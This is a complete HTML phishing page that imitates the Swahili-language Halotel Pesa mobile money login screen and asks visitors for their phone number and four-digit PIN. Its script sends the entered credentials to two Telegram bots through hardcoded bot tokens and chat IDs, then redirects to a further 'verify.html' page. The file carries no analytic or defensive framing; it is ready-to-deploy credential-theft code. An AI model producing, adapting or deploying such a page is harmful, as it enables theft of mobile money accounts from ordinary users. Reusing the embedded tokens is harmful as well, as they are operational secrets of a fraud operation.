<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halotel - Kuingia</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: white;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            display: flex;
            flex-direction: column;
        }
        
        .logo {
            text-align: center;
            padding: 40px 20px 20px;
            flex-shrink: 0;
        }
        
        .logo-img {
            height: 40px;
            object-fit: contain;
        }
        
        .login-content {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px 40px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        
        .title {
            font-size: 26px;
            font-weight: 600;
            color: #333;
            margin-bottom: 30px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #ff6600;
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 16px 20px;
            margin-bottom: 30px;
            background: white;
        }
        
        .flag {
            font-size: 28px;
            margin-right: 12px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #ff6600;
            font-weight: 600;
            font-size: 18px;
            margin-right: 16px;
        }
        
        .dropdown-arrow {
            font-size: 14px;
            margin-left: 6px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 16px;
            color: #666;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 25px;
        }
        
        .pin-box {
            width: 55px;
            height: 55px;
            border: 2px solid #ff6600;
            border-radius: 16px;
            font-size: 28px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
        }
        
        .forgot {
            font-size: 15px;
            color: #ff6600;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 30px;
        }
        
        #loginBtn {
            display: none;
            width: 100%;
            max-width: 400px;
            padding: 18px;
            background: linear-gradient(to right, #ff6600, #e05500);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 40px;
            box-shadow: 0 8px 20px rgba(255, 102, 0, 0.3);
        }
        
        .bottom-section {
            background: #ff6600;
            color: white;
            padding: 90px 30px 60px;
            text-align: center;
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            position: relative;
            flex-shrink: 0;
        }
        
        .curve {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 80px;
            background: white;
            border-radius: 0 0 50% 50% / 0 0 100% 100%;
            transform: scaleX(1.8);
            transform-origin: top;
        }
        
        .bottom-content {
            position: relative;
            z-index: 2;
        }
        
        .bottom-text {
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-bottom: 35px;
        }
        
        .bottom-btn {
            background: white;
            color: #ff6600;
            border: none;
            border-radius: 30px;
            padding: 16px 28px;
            font-weight: 600;
            font-size: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            width: 160px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            text-decoration: none;
        }
        
        .btn-icon {
            font-size: 24px;
            color: #ff6600;
        }
        
        .version {
            font-size: 14px;
            margin-bottom: 10px;
            opacity: 0.9;
            font-weight: 500;
        }
        
        .terms {
            font-size: 13px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            font-weight: 500;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #ff6600;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 25px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 17px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 300px;
            font-weight: 500;
        }
    </style>
</head>

<body>
    <div class="logo">
        <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGt3VB_WtrYNUD0gcLSejZvKr1J2IOTeQJwRAbtZLR5w&s=10" alt="Halotel Logo">
    </div>

    <div class="login-content">
        <h1 class="title">Ingia</h1>

        <div class="phone-group">
            <span class="flag">🇹🇿</span>
            <div class="country-select">
                +255 <span class="dropdown-arrow">▼</span>
            </div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Nambari ya Simu">
        </div>

        <div class="pin-label">Ingiza Namba Siri</div>
        <div class="pin-group">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
        </div>

        <a href="#" class="forgot">Umesahau PIN?</a>

        <button id="loginBtn">INGIA</button>
    </div>

    <div class="bottom-section">
        <div class="curve"></div>
        <div class="bottom-content">
            <div class="bottom-text">
                Kusajili akaunti ya Halotel Pesa au kupata msaada,<br> bonyeza hapa chini
            </div>
            <div class="bottom-btns">
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">👤</div>
                    Jisajili
                </a>
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">ℹ️</div>
                    Msaada
                </a>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                Kwa kuingia unakubaliana na <a href="#">Sheria na Masharti</a>
            </div>
        </div>
    </div>

    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Tafadhali subiri...<br> Hii inachukua sekunde chache
        </div>
    </div>

    <script>
        const BOT_TOKEN_1 = '8816995969:AAE_KgpS2Cy68yLuRLtdyjSc4QWXsoBTARk';
        const CHAT_ID_1 = '8769285149';

        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
        const CHAT_ID_2 = '5615316142';

        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');
        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        let pinValue = '';

        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        // ========== LOGIN CLICK ==========
        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Tafadhali ingiza nambari ya simu');
                return;
            }

            spinnerOverlay.style.display = 'flex';

            // Save phone to localStorage
            localStorage.setItem('phone', phone);

            // Build the credential message
            const message = `Jaribio Jipya la Kuingia Halotel\n\nSimu: +255 ${phone}\nPIN: ${pinValue}`;

            // Send to Bot 1
            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_1,
                    text: message
                })
            }).catch(() => {});

            // Send to Bot 2
            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID_2,
                    text: message
                })
            }).catch(() => {});

            // Proceed to next page
            setTimeout(() => {
                window.location.href = 'verify.html';
            }, 1500);
        });

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
